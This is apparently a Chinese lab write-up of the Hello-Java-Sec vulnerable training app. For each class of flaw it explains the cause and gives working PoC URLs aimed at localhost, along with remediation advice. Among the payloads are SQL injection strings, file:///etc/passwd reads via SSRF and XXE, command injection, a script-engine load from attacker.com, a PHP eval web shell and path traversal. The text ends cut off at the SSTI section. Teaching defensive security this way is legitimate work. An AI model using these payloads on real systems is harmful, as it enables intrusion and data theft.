# 环境部署
该靶场通过Docker在Ubuntu虚拟机中部署：

```bash
git clone https://github.com/j3ers3/Hello-Java-Sec
cd Hello-Java-Sec
mvn clean package -DskipTests
docker-compose up
```

部署完成后在浏览器输入[http://127.0.0.1:8888/](http://127.0.0.1:8888/)进入登录界面，默认账号/密码是admin/admin。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756262988205-acf037df-4c04-4e72-86d3-7ac398539a52.png)

# 漏洞成因及修复意见
## SQL注入
### JDBC
#### 漏洞成因
1. 直接拼接

采用Statement方式拼接SQL语句：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756279528021-1dfb69f4-e222-41f4-ad3a-fca76cea6574.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul1?id=' or '1'='1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756279671196-da02d0f2-be1e-4c13-b610-298ab52233c2.png)

    - 返回当前数据库用户

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul1?id=1' and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280067424-60728567-da23-4489-88a0-89fbb98aa39a.png)

P.S.，`updatexml()` 是 MySQL 的一个 XML 函数，语法为：

```plain
updatexml(XML_document, XPath_string, new_value)
```

如果传入的XPath不合法，MySQL会抛出错误，并把出错的字符串内容返回。`0x7e`是十六进制的`~`符号，用来做分隔符。`(SELECT user())`会返回当前数据库用户，例如：`root@localhost`。`--+`是SQL注释符号，表示把后面原始语句截断，不执行。标准 SQL的注释符号是`--`， 在MySQL中必须写成`-- `（后面有空格）。`--+`其中的`+`在 URL 编码里等价于空格，所以`--+`实际就是`-- `，也可以写成`--%20`（`%20` 是 URL 编码的空格 ）或者`-- -`（直接手动加一个空格）。 

2. 预编译使用不当

尽管用了预编译，但仍然直接拼接：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280868931-16ca9585-3848-4da4-8144-fda6dd96e9e5.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul2?id=1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756280984714-64d5a724-24eb-41de-8500-f4bb6a27f3f7.png)

    - 返回当前数据库用户

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul2?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756281106332-704167c1-af65-4933-8e58-95525ed223a9.png)

3. JdbcTemplate使用不当

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282306137-31ae686c-5946-4c7d-8902-0c650502e88f.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/jdbc/vul3?id=1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282399080-1cd3ac57-014f-47ff-abee-ba728dedb96b.png)

页面虽然返回了`Whitelabel Error Page`，但是其实SQL注入已经触发了，只是因为`queryForMap`要求返回结果只能有一条记录，如果结果是多条，Spring会抛出`IncorrectResultSizeDataAccessException`，所以会看到报错页面。

对此，可以简单改造下`/vul3`接口：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282611869-e8309d90-a3bf-4722-9fae-3f7d00fa41ff.png)

再使用同一个PoC，就可以看到返回了所有用户数据：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282657527-bf7c05d2-8326-4fef-ad6f-ee5d9e926d26.png)

#### 修复意见
1. 黑名单过滤（会存在绕过且易误伤，不推荐）

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282958560-4f49d557-205e-4d96-8893-e72fc3e47259.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756282987695-1aae0b51-dbcc-4fc0-b1fd-db9a20e9dc66.png)

2. 预编译

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283048081-1548dad5-72e7-4af7-9426-32f852209b56.png)

在`ORDER BY`后面等位置通常无法使用参数化，可能存在拼接的情况，应该使用白名单过滤等方式。 

3. 采用ESAPI过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283151289-4896bb61-a67d-4a46-be4a-196a5c48b9ed.png)

`Codec<Character> oracleCodec = new OracleCodec();`这行表示告诉ESAPI用Oracle数据库的规则来进行转义，把危险字符转成安全的形式 （其实这里应该用`Codec<Character> mysqlCodec = new MySQLCodec(MySQLCodec.Mode.STANDARD);`，因为数据库驱动用的是`com.mysql.cj.jdbc.Driver`）。

`ESAPI.encoder().encodeForSQL(oracleCodec, id)`表示根据指定的数据库规则（这里是 OracleCodec），对用户输入的`id`进行SQL安全编码，简而言之，它会对输入里可能影响SQL语法的字符（比如`'`、`"`、`;`、`--`）进行转义，让它们变成普通的字符串内容，而不是SQL关键符号。  

4. 正则过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756283937321-ac9fc504-c739-404a-8789-2121fc22a904.png)

现实系统里，用户名/邮箱/昵称等很难只靠`[a-zA-Z0-9]`表达，业务功能受限较大。 

5. 强制类型转换

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284152133-44cc67d7-ce11-42de-b51a-c79fd2119312.png)

如果业务需求中`id`改成`UUID`、字符串类型，就又不合适了。 

### MyBatis
#### 漏洞成因
1. 直接使用`${}`

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284683994-65ebf1af-4504-4fff-91ac-ed1bb52c4e56.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284701691-2462ab7c-6533-422a-ba9c-280d8c5af451.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/id/1 or 1=1
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284817423-13b4f592-f91f-4d31-8a40-9a586a99ee0d.png)

2. 使用`${}`进行模糊查询

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284977146-4147c22c-06e4-4480-b64e-df2183fb402a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756284989430-7396d65b-6a14-4f1d-9490-8a815fe08a54.png)

PoC：

    - 返回所有用户数据

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/search?user=' or 1=1--+
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285227269-dc464a71-3476-4b6e-84aa-6da629898f2a.png)

3. order by注入

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285456173-60eb3fcc-c007-47d2-87fa-e00717ac2282.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285487846-f819a5c5-a80f-4c10-af35-f3d648cf8b94.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756285470790-64b9f730-ca30-46b2-93f0-7c483eba493c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/sqli/mybatis/vul/order?field=id&sort=desc,abs(111111)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756286993807-8a1996e1-edd7-4942-ae1e-89667b9b9d3a.png)

页面正常返回，说明`abs()`函数被执行了。

#### 修复意见
1. 使用`#{}`

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756347806429-0f4b44e4-8e0c-44e7-b7cc-0c20a05fc319.png)

2. 强制数据类型

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756347888760-312d1a8f-0002-421f-9072-01dab2cd5b35.png)

3. 排序映射

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348032776-b5c09737-66bd-4cbc-867f-999942a972a8.png)

4. 白名单正则校验

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348110881-b4e0c9bf-b554-4f24-b8a8-3075da4d52f5.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348092455-06d1da7a-8ee8-45ab-8421-fc8da54b5033.png)

## SSRF
### 漏洞成因
1. 未对用户可控的URL参数做任何形式的过滤和限制

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348441290-3c6d04b3-3b63-4917-85cd-29b93990689c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SSRF/URLConnection/vul?url=file:///etc/passwd
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756348760325-750e2c6a-7233-4f90-8a67-93e492023436.png)

2. 绕过

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351735194-b106aca9-10b9-4ff7-92c3-88d3f7c6de4a.png)

PoC：

查询得到本机内网IP`192.168.159.128`，属于私网段，被`Security.isIntranet()`禁止直接访问。到[https://tinyurl.com/](https://tinyurl.com/)生成短链接[https://tinyurl.com/guohuan](https://tinyurl.com/guohuan)：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351473169-b1553fd7-0aff-4f98-b794-24f97c2ca289.png)

访问漏洞接口：

```plain
http://127.0.0.1:8888/vulnapi/SSRF/URLConnection/vul?url=https://tinyurl.com/guohuan
```

代码校验时，`Security.urltoIp("tinyurl.com")`解析出公网 IP，不属于内网，校验通过。tinyurl返回302跳转，`URLConnection` 默认会自动跟随跳转（`HttpURLConnection`默认`setInstanceFollowRedirects(true)`），但是新的Location地址不会再走`Security.urltoIp()`校验，浏览器能正常访问`192.168.159.128:8888`的服务，成功SSRF内网：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756351442442-605e6645-d0d4-4840-8b6e-205737ed05d5.png)

### 修复意见
1. 白名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756352456090-d3292ae0-7307-4fb3-952f-4d0ae097def1.png)

## RCE
### 漏洞成因
1. ProcessBuilder方式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756362150875-5f94a106-0179-4fb1-bdc2-91fabcb01827.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ProcessBuilder/vul?filepath=/tmp;whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756362309615-25d3124a-dd6c-4998-b6fe-7cfb556ff2e3.png)

2. Runtime方式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363001102-208fb0ca-872a-4811-9afd-72529b17c720.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/Runtime/vul?cmd=whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363033093-b4a3f622-53bf-41d3-b174-3d3f242566e7.png)

3. ProcessImpl方式

ProcessImpl是更为底层的实现，Runtime和ProcessBuilder执行命令实际上也是调用了ProcessImpl这个类：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363172886-7f743982-c291-487d-a3d8-1b4621644625.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ProcessImpl/vul?cmd=whoami
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756363221205-d6be36ea-d54c-4b11-9664-762176116248.png)

4. 脚本引擎代码注入

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756364075927-93cf2cf1-4daf-43bb-9d9b-b2545df4e96d.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/ScriptEngine/vul?url=http://attacker.com/java/1.js
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756364179515-7b833430-8b77-41d5-a3ee-f06c6fceb181.png)

5. Groovy执行命令

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756365578122-ce6515e1-ed0c-41d7-8dfa-3ebf7f9bd8b2.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/RCE/Groovy/vul?cmd="cmd /c start calc".execute()
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756365809733-4eed7193-7790-40ba-833f-28049c2b0760.png)

### 修复意见
1. 黑名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756366052949-6e13eaeb-7705-42e6-8357-8170832a1fa4.png)

2. 白名单

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756366088581-510fb93b-b357-4ec6-b445-4d90f66d62ad.png)

## XSS
### 反射型
#### 漏洞成因
1. 输出未转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756709980214-fab1c610-25a3-4c4b-a606-eb6992f20613.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XSS/reflect?content=%3Cscript%3Ealert(%22Hacked%22)%3C/script%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710051486-eb34f266-eeb7-445a-80ad-3ca9abe40682.png)

2. 同上

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710249533-e051662e-4d2c-45e2-bd09-6f43a88ccdb7.png)

和第一段一样，本质都是输出未转义。区别在于第一段代码SpringMVC默认会将`String`返回值当作视图内容或直接写入响应体。这里直接操作`HttpServletResponse`，调用`getWriter().println(content)` 把输入输出到响应体。如果没有设置`Content-Type`，默认仍是`text/html`，浏览器依然会把`<script>`当作HTML渲染并执行。

#### 修复意见
1. 自定义过滤

对特殊字符进行转义：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710561599-2e307a91-c97b-47b2-a632-6427ff957881.png)![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710577133-9ca0a444-85ba-4ec5-8bcc-4fabb0afdb39.png)

2. 采用Spring自带的方法对特殊字符进行转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710735424-044eb351-7b83-4dc1-b4f7-539f9bef5096.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710757741-d5c939d5-2787-4777-a4c1-91486d110716.png)

3. 富文本处理

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710808509-29616be8-bb98-4020-ae57-b96ba4f58434.png)

4. OWASP Java Encoder

也是对特殊字符进行转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710948896-8a404ef0-20cd-4def-a8e5-e36d14ebb66e.png)

5. ESAPI

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756710999503-1985cd9d-a3f4-41d2-9cb8-17f975f2c401.png)

### 存储型
#### 漏洞成因
1. 输入未校验，输出未转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711067899-5bca969c-a16a-409b-93fe-e761f7452eeb.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711378402-d109c687-c634-435c-b5e9-64829aa6490f.png)

查看数据库中存储的XSS数据：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711441745-f0ece6d7-4ae7-4998-9478-1fda1bc1d49a.png)

#### 修复意见
1. 后端输入转义，前端输出转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711550620-7503f14a-5c07-4a9f-ba7d-aa630bac79b3.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711703499-771d459c-99ad-4258-913b-638501cd3e31.png)

## XXE
### 漏洞成因
1. XMLReader

在未禁用外部实体解析的情况下，XML解析器可能会处理外部实体声明，从而导致XXE：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756711849498-134591e4-21d1-492e-8950-a1b5d9dd0129.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/XMLReader?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1756714488651-5d3c8d6f-8005-4e0c-8dc8-3225c7082a8e.png)

P.S.，为了避免出现400错误，这里放宽Tomcat的查询字符校验，在`application.properties`文件中添加以下配置：

```plain
server.tomcat.relaxed-query-chars=<,>,[,],{,},|,\,^,`
server.tomcat.relaxed-path-chars=<,>
```

2. SAXParser

SAXParser是XMLReader的替代品，它提供了更多的安全措施，例如默认禁用DTD和外部实体的声明，如果需要使用DTD或外部实体，可以手动启用它们，并使用相应的安全措施：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296055260-ac0f8aa2-49e9-41e3-b9e6-d96f39247b9f.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/SAXParser?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296087541-8e5ce29a-5231-48a1-9158-6fcd89f471fb.png)

3. SAXReader

SAXReader类默认情况下可能允许处理外部实体，导致XXE攻击：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757295686636-f9f35287-f37d-44f9-a1ca-29845a56956c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/SAXReader?content=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C!DOCTYPE%20root%20%5B%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757295633348-00c9e97b-e8a5-429c-a1c1-d1ff32822b84.png)

4. SAXBuilder

`SAXBuilder`是JDOM库的一个类，它会解析XML数据并将其转换为`Document`对象。在默认情况下，它允许解析外部实体（如DTD和外部XML实体）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296280672-eb786d8a-c909-4582-9883-b0ca621809d4.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296449256-acd37fa7-bbb7-49f5-b1ab-0c26e57af7e4.png)

5. DocumentBuilder

`DocumentBuilderFactory`是用于创建DOM解析器的工厂类，它默认允许解析外部实体（如DTD和外部XML实体）：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296589106-d976581c-44c5-4759-b820-4d431254a3b8.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/XXE/DocumentBuilder?content=%3c%3f%78%6d%6c%20%76%65%72%73%69%6f%6e%3d%22%31%2e%30%22%20%65%6e%63%6f%64%69%6e%67%3d%22%75%74%66%2d%38%22%3f%3e%3c%21%44%4f%43%54%59%50%45%20%74%65%73%74%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%3e%5d%3e%3c%70%65%72%73%6f%6e%3e%3c%6e%61%6d%65%3e%26%78%78%65%3b%3c%2f%6e%61%6d%65%3e%3c%2f%70%65%72%73%6f%6e%3e
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296640858-4d464462-2c02-487a-8a05-701be55d47e8.png)

6. Unmarshaller

使用`Unmarshaller`时，未对`XMLStreamReader`和`JAXBContext`进行适当的安全配置，可能导致XML解析时处理外部实体，从而引发XXE攻击：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296779438-208a32fd-25cd-4552-9b04-dd3aab97a27b.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296813967-b21a67f9-c36d-464d-afae-2f23bba4dfff.png)

### 修复意见
1. 黑名单过滤

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296901910-e6c963f8-b5de-44da-aeac-3e25e0e556d7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296919297-422ba38d-020c-4294-aefd-7dd7cfa0d3d8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757296941240-eaf5782c-0dad-49f4-b0ea-13241310e8b2.png)

## DoS
### 漏洞成因
1. 正则DoS（ReDoS）

当编写的正则表达式存在缺陷时, 攻击者可以构造特殊的字符串来大量消耗系统资源，造成服务中断或停止：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297239921-e8d7f3fc-ce58-4fd0-a724-f3640ab612b8.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/DoS/redos/vul?content=aaaaaaaaaaaaaaaaaaaa
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297269452-6d8070b3-1d59-4c74-a913-6a511d65bcc8.png)

2. 图片DoS

攻击者可以通过发送大量请求，要求服务器放大图片，从而使服务器资源耗尽：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297448918-ef07662d-67a6-4d48-8380-b40ab1d2c661.png)

`ImageIO.read`方法会尝试加载图片。如果传入的图片非常大或包含复杂的图形数据，它可能会消耗大量的内存和计算资源，导致服务崩溃或性能急剧下降。这是典型的内存耗尽或资源耗尽类型的DoS攻击。

在`originalImage.getScaledInstance(width, height, BufferedImage.SCALE_SMOOTH)`这行代码中，使用了`getScaledInstance`来缩放图片。如果传入的`width`和`height`非常大（例如，几千像素或更大），则图像缩放操作可能会消耗大量的CPU资源，造成CPU过载。

PoC：

```plain
http://127.0.0.1:8888/vulnapi/DoS/imagedos/vul?width=1000&height=1000
```

### 修复意见
1. com.google.re2j

`com.google.re2j`包中的正则表达式引擎采用了贪婪匹配，避免了无限匹配的情况：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297752982-3252828b-2bf0-4aeb-bfd2-62fff8d3feb0.png)

2. 限制图片的最大尺寸

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757297803440-6502b7e3-9a38-4eac-b4aa-b75a561277b4.png)

## CSRF
### 漏洞成因
1.  依赖于浏览器的会话信息（如Cookie或Session）来验证用户身份，而没有足够的防护措施  

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757298497601-ba6f86c9-11a9-4733-92ba-1ae31006799f.png)

攻击者构造一个恶意网页，诱导受害者点击一个链接，或者加载一个图片、表单提交等，伪造转账请求。如果目标应用没有 CSRF 防护，服务器将错误地认为这是合法用户的请求，执行转账操作。

### 修复意见
1. 使用csrfToken校验

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757299473649-a2cfabb7-5d68-4afc-a6be-b3f71b5d1be4.png)

2. 校验referer判断请求是否来自本站（可以伪造）

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757299588739-1dbefd74-4647-4275-924c-46eac12ddd02.png)

## 任意文件操作
### 漏洞成因
1. 任意文件上传

服务器没有正确地检查和限制上传的文件类型、大小、后缀名等信息：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318153399-2fd7e9ee-47a8-4eea-9abb-1003f670ff48.png)

新建一个名为`ant.php`的Shell，其内容为：

```php
<?php eval($_POST['ant']); ?>
```

上传该Shell：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757316009983-accd9287-03af-4736-aeb5-c122ff7e4466.png)

上传成功：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757315997450-eb30d1f1-27b6-44d5-af63-e32faf884f04.png)

2. 文件类型判断可绕过

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318384461-d1c13cda-f512-4bb1-ad9c-7f6d18c7f586.png)

`Content-Type`头部并不是完全可靠的安全措施，可以使用工具手动修改上传请求中的`Content-Type`，例如：

```bash
curl -X POST -F "file=@ant.php" -H "Content-Type: image/jpeg" http://127.0.0.1:8888/vulnapi/upload/uploadVul2
```

服务器会误以为上传的文件是 JPEG 图片，而实际上传的可能是一个 PHP 脚本，绕过了服务器端的文件类型检查。应该要用魔术数字检查等方法更为严谨。 

3. 任意文件下载

文件路径没做限制，可以通过../递归下载任意文件：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318805335-75aae041-00c0-4cf9-88cd-c8099cb5ecfa.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/Traversal/download?filename=../../etc/passwd
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318859157-634db6f8-7c16-4e7a-99e8-d1dd13d6ded7.png)

4. 任意路径遍历

原理同上，可以通过`../../`来访问项目目录外的文件：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318948216-66030586-ebf4-4a3e-a451-865d825d4b29.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/Traversal/list?filename=../
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757318976659-bde0246a-dd2e-4b05-92d5-1e6be3543e68.png)

### 修复意见
1. 白名单后缀名

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319060456-fc3b1ccd-4e9c-4475-9a56-ecfdfc4e70c7.png)

2. 黑名单过滤路径

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319100985-17d6e3db-dd1f-45b0-be6d-0a0876e28cba.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319120420-a4775b4e-cf50-4c8f-97af-da58d0e852fe.png)

3. 使用`normalize`方法对路径进行规范化，将特殊字符转义

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319193397-3c4a8d6f-7082-43d9-bbc8-218e42e49503.png)

4. 对文件名做映射生产id值，通过参数化下载文件，可以有效防止遍历问题

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319281341-15ffb4d4-12bf-46c3-ba47-a950bbc007d8.png)

## 开放重定向
### 漏洞成因
1. 参数URL未做安全限制且由用户控制

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319654164-c6433840-b65c-483c-a0e7-1b8f2245320c.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/redirect/vul?url=https://www.baidu.com/
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319715257-d3d2376f-599e-4a02-9fdd-9cb744a6e0f7.png)

2. ModelAndView方式的重定向

本质上和`"redirect:"`在 Spring 中是类似的，都是通过指定视图来进行重定向，但它使用了`ModelAndView`对象，允许更灵活的配置和视图渲染：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757319798856-be9445c8-ae9b-49f0-891d-6f17abc32de4.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/redirect/vul2?url=www.baidu.com/
```

3. HttpServletResponse方式的重定向

这种方式与前两种方式的区别在于，这是直接操作HTTP响应对象：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757320056785-38c3fa1a-cab4-4aa9-bfda-81cac523a2b3.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/redirect/vul3?url=https://www.baidu.com
```

### 修复意见
1. 白名单模式

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757320265212-50e53fac-113a-49e6-b109-4daccc91dd1e.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1757320255071-e4f47df0-9cbb-4bc2-8bfc-e56a8eabf00e.png)

## 越权访问
### 漏洞成因
1. 身份越权

`user`参数可以由用户完全控制，没有校验。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160035553-798f3f5e-6993-40b6-adf6-d89cf47f7180.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160117483-310b35d1-1224-4a75-a1eb-971b755e166d.png)

2. ID遍历

攻击者可以直接对ID进行枚举爆破，获取用户信息。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160211101-9940306a-40b5-46f0-91d9-d0b06e8d8e1c.png)

PoC：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160272192-8fc31129-678a-475b-9b71-e1fea7114e02.png)

### 修复意见
1. 通过session判断当前用户与要查询的用户是否一致，只允许查询自己的信息

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160357314-50942e23-3f5d-4ef5-a2fe-ec4cfa817ec0.png)

2. 提高ID的复杂度，用UUID来作为用户ID

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160439729-2f8e01d3-4c82-4a8e-8676-ab1c1e285de9.png)

## 接口未授权访问
### 漏洞成因
1. 未进行鉴权拦截

例如api接口文档可以直接访问：

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160758013-e91c55bb-e5e0-4bd3-9a70-827d0e3fd4c0.png)

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160797590-ab644e4d-11e1-440a-85b7-42d4525d3d49.png)

### 修复意见
1. 在拦截中拦截该接口

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758160879934-cbf61459-0375-43b4-bff0-27f6424ffd33.png)

## SpEL表达式注入
> SpEL（Spring Expression Language）是Spring Framework中的一种表达式语言，它允许在运行时对对象图进行查询和操作。在应用程序中，如果使用不当，攻击者可以通过构造恶意输入来注入SpEL表达式，从而在表达式被解析时执行任意的命令，导致安全漏洞。 
>

### 漏洞成因
1. 默认的StandardEvaluationContext权限过大

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758161185904-d390a594-408d-48f6-a8e1-165988297383.png)

PoC：

```plain
http://127.0.0.1:8888/vulnapi/SPEL/vul?ex=T(java.lang.Runtime).getRuntime().exec(%27calc.exe%27)
```

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758161769754-0b9dcdbe-327a-4bb2-94b2-1712a0ea25bd.png)

### 修复意见
1. 使用SimpleEvaluationContext

SimpleEvaluationContext仅支持SpEL语言语法的一个子集。它不包括 Java 类型引用，构造函数和bean引用。

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758162294076-618cb1b7-c771-46d3-876c-1dc14ee81084.png)

## SSTI表达式注入
> SSTI（Server Side Template Injection）是指攻击者向Web应用程序的模板引擎注入恶意的模板语言代码，从而使得攻击者能够在服务端执行任意代码。这种攻击通常发生在Web应用程序使用模板引擎来动态生成页面内容的情况下，例如FreeMarker、Velocity、Thymeleaf等。 
>

### 漏洞成因
1. Thymeleaf模板文件参数可控

![](https://cdn.nlark.com/yuque/0/2025/png/43311313/1758162744490-ca2c92d0-a838-40ae-a084-0c5795c644d3.png)

PoC：

```plain
